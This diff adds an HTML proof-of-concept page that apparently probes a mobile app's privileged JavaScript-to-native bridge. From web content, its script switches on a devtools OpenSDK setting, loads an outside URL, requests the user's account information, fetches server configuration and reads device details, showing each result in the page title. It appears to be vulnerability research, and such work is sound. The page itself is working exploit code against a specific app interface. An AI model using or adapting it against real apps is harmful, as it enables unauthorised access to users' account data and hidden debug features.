@@ -1,0 +1,48 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P4</h1><pre id="log"></pre>
+<script>
+document.title='WM-POC-P4';
+function note(t){ document.title=String(t); }
+function call(mod, method, param){
+  if(!window.JSCallJavaMgr){ note('NOJSB '+mod+'.'+method); return; }
+  window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+    callback:'window.__wmpoc', module:mod, method:method, param:param||{},
+    callId:'p4-'+mod+'-'+method
+  }));
+}
+var q=[], finished=false;
+window.__wmpoc=function(res){
+  try{ q.push(JSON.stringify(res)); }
+  catch(e){ q.push(String(res)); }
+};
+function flush(){
+  if(q.length){
+    note('CB '+q.shift());
+    setTimeout(flush, 1600);
+    return;
+  }
+  if(finished){ note('P4-DONE'); return; }
+  setTimeout(flush, 400);
+}
+setTimeout(flush, 800);
+var steps=[
+  function(){ note('JSB='+!!window.JSCallJavaMgr); },
+  function(){ call('DevtoolWebviewPlugin','GetOpenSDKSwitchState',{}); },
+  function(){ call('DevtoolWebviewPlugin','UpdateOpenSDKSwitchState',{state:1}); },
+  function(){ call('DevtoolWebviewPlugin','GetOpenSDKSwitchState',{}); },
+  function(){ call('CommonPlugin','LoadUrl',{url:'https://httpbin.org/uuid'}); },
+  function(){ call('CommonPlugin','GetAccountInfo',{}); },
+  function(){ call('CommonPlugin','RequestServerData',{url:'/web-service/web-config',method:'GET'}); },
+  function(){ call('DevicePlugin','GetClientInfo',{}); }
+];
+var i=0;
+function next(){
+  if(i>=steps.length){ finished=true; return; }
+  try{ steps[i](); }catch(e){ q.push('EX '+e); }
+  i++;
+  setTimeout(next, 2200);
+}
+setTimeout(next, 600);
+</script>
+</body></html>
